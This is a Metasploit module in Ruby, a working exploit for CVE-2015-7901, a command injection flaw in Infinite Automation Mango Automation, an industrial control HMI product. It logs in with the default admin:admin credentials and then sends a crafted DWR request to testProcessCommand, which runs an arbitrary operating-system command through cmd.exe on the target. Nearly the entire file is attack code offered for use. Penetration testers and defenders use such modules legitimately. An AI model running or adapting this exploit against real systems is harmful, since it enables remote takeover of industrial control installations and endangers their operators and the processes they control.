require 'msf/core'

class MetasploitModule < Msf::Auxiliary
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Infinite Automation Mango Automation Command Injection',
			'Description'    => %q{
				This module exploits a command injection vulnerability found in Infinite
				Automation Systems Mango Automation v2.5.0 - 2.6.0 beta (builds prior to
				430).
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2015-7901' ],
					[ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-15-300-02' ]
				],
			'DisclosureDate' => 'Oct 28 2015'))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('TARGETURI', [ false, 'Base path to Mango Automation', '/login.htm']),
				OptString.new('CMD', [ false, 'The OS command to execute', 'calc.exe']),
				OptString.new('USER', [true, 'The username to login with', 'admin']),
				OptString.new('PASS', [true, 'The password to login with', 'admin']),
			], self.class )
	end

	def do_login(user, pass)
		uri =  normalize_uri(target_uri.path)
		
		res = send_request_cgi({
			'method'	=>	'GET',
			'uri'			=>	uri
		})

		if res.nil?
			vprint_error("#{peer} - Connection timed out")
			return :abort
		end

		cookie = res.headers['Set-Cookie']

		print_status("Attempting to login with credentials '#{user}:#{pass}'")

		res = send_request_cgi({
			'method'	=>	'POST',
			'uri'			=>	uri,
			'cookie'	=>	cookie,
			'vars_post'		=>	{
				'username'	=>	user,
				'password'	=>	pass,
			}
		})

		if res.nil?
			vprint_error("#{peer} - Connection timed out")
			return :abort
		end

		location = res.headers['Location']
		if res and res.headers and (location = res.headers['Location']) and location =~ /data_point_details.shtm/
			print_good("#{peer} - Successful login: '#{user}:#{pass}'")
		else
			vprint_error("#{peer} - Bad login: '#{user}:#{pass}'")
			return
		end

		return cookie
		
	end

	def run
		cookie = do_login(datastore['USER'], datastore['PASS'])

		data =  "callCount=1&"
		data << "page=%2Fevent_handlers.shtm&"
		data << "httpSessionId=%0D%0A&"
		data << "scriptSessionId=26D579040C1C11D2E21D1E5F321094E5866&"
		data << "c0-scriptName=EventHandlersDwr&"
		data << "c0-methodName=testProcessCommand&"
		data << "c0-id=0&"
		data << "c0-param0=string:c:\\windows\\system32\\cmd.exe /c #{datastore['CMD']}&"
		data << "c0-param1=string:15&"
		data << "batchId=24"

		res = send_request_raw({
			'method'	=>	'POST',
			'uri'			=>	normalize_uri("dwr", "call", "plaincall", "EventHandlersDwr.testProcessCommand.dwr"),
			'cookie'	=>	cookie.split(";")[0],
			'ctype'		=>	"application/x-www-form-urlencoded",
			'headers'	=>	{
				'Origin'	=>	'null',
				'Upgrade-Insecure-Requests'	=>	1,
				'Connection'	=> "keep-alive"
			},
			'data'	=>	data,
		}, 5)

		if res.body =~ /org.directwebremoting.extend.MarshallException/
			print_error("Something went wrong...")
			puts res.body
		elsif res.body =~ /Check your Tomcat console for process output/
			print_good("Command executed successfully")
		end

	end
end